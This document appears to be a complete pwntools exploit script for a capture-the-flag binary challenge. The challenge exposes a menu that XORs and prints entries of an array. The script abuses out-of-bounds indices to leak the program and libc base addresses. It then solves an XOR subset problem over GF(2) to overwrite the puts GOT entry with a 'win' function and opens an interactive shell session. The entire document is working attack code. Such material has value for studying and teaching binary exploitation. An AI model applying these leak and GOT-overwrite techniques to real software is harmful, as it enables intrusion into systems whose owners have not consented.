#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def insert_to_basis(basis, basis_trace, num):
    """ Inserts num into the XOR basis while tracking contributing elements. """
    trace = [num]  # Track elements forming this basis component
    
    for i in range(len(basis)):
        if (num ^ basis[i]) < num:
            num ^= basis[i]
            trace.extend(basis_trace[i])  # Track elements forming this number
    
    if num:  # If num is nonzero, it contributes to the basis
        basis.append(num)
        basis_trace.append(trace)  # Store trace of elements

def find_xor_subset(A, B):
    basis = []  
    basis_trace = []  # Tracks how each basis element was formed

    # Build basis with tracking
    for num in A:
        insert_to_basis(basis, basis_trace, num)

    # Try to form B and recover subset
    subset = []
    for i in range(len(basis)):
        if (B ^ basis[i]) < B:  # If basis[i] contributes to B
            B ^= basis[i]
            subset.extend(basis_trace[i])

    return subset if B == 0 else []

def xor_board(i, j):
    data = str(i).encode() + b" " + str(j).encode()
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b">", data)

def print_board(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b">", str(idx).encode())
    io.recvuntil(b"Value: ")
    data = int(io.recvline().strip(b"\n"), 16)
    return data

def solve():

    """
    Get info leaks:
    - clear board -> arr[0]
    - set board to some pointer using oob read via xor
    - leak the memory
    """

    xor_board(64, 64)
    xor_board(64, -7) 
    leak = print_board(64) 
    exe.address = leak - 0x3488
    info("elf base: %#x", exe.address)

    xor_board(64, 64)
    xor_board(64, -2)
    stdin = print_board(64)
    libc.address = stdin - libc.sym["_IO_2_1_stdin_"]
    info("libc base: %#x", libc.address)


    """
    Got overwrite:
    - Use oob write via xor to set a got address to win function
    - Since no arb write we will leverage the values in arr to set the got to our right value

    - Solve xor problem constraint using xor subset problem (Gaussian Elimination under GF(2))
    """

    puts = libc.sym["puts"]
    win = exe.sym["win"]

    A = [1 << i for i in range(63)]
    B = puts ^ win

    info("key: %#x", B)

    subset = find_xor_subset(A, B)
    result = 0
    for i in subset:
        result ^= i
    
    assert(result == B)

    idx = []
    for i in subset:
        idx.append(int(math.log2(i)))
    
    for i in range(1, len(idx)): # arr[0] is always almost needed so skip it
        xor_board(0, idx[i])

    xor_board(-19, 0) # got overwrite here

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

